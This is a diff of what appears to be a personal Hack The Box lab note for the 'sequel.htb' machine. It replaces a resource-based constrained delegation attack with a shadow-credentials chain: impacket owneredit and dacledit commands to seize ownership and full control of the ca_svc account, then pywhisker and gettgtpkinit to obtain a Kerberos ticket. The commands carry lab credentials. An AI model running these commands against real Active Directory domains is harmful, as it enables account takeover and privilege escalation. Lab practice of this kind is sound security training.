@@ -151,21 +151,31 @@ bloodhound password: Sc458849282!
 - Utilize Resource-Based Constrained Delegation to take control of ca_svc
 ```shell
 
-python3 /usr/share/doc/python3-impacket/examples/addcomputer.py Sequel.htb/ryan:'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -computer-name FAKECOMPUTER$ -computer-pass 'Password123!'
-# Create a new computer 
+python3 /usr/share/doc/python3-impacket/examples/owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
+# Make Ryan the owner of the object
 
-python3 /usr/share/doc/python3-impacket/examples/rbcd.py SEQUEL.HTB/ryan:WqSZAF6CysDQbGb3 -delegate-to ca_svc -delegate-from FAKECOMPUTER$ -dc-ip 10.10.11.51
-# Tell ca_svc to trust the new fakecomputer
+sudo python3 /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
+# Gain full control
 
-python3 /usr/share/doc/python3-impacket/examples/getST.py SEQUEL.HTB/FAKECOMPUTER$:'Password123!' -impersonate ca_svc -dc-ip 10.10.11.51 -self
-# Capture the hash of ca_svc
+sudo python3 /opt/redteam/pywhisker/pywhisker/pywhisker.py -d sequel.htb -u ryan -p  'WqSZAF6CysDQbGb3' --target "CA_SVC" --action "add" --filename CACert --export PEM   
+# add a certificate
 
 
+# THIS MUST BE RUN IN A VIRTUAL ENVIRONMENT
+python3 gettgtpkinit.py -cert-pem /opt/redteam/pywhisker/pywhisker/CACert_cert.pem -key-pem /opt/redteam/pywhisker/pywhisker/CACert_priv.pem sequel.htb/ca_svc ca_svc.ccache
+# Request the certificate
 
 ```
+
+==Now we have a valid TGT==
+![[Pasted image 20250620213848.png]]
 
 
 
 ca_svc is a member of CERT_PUBLISHERS
 ![[Pasted image 20250619230847.png]]
 
+
+HOW TO START A VIRTUAL ENVIRONMENT:
+1. python3 -m venv venv
+2. source venv/bin/activate
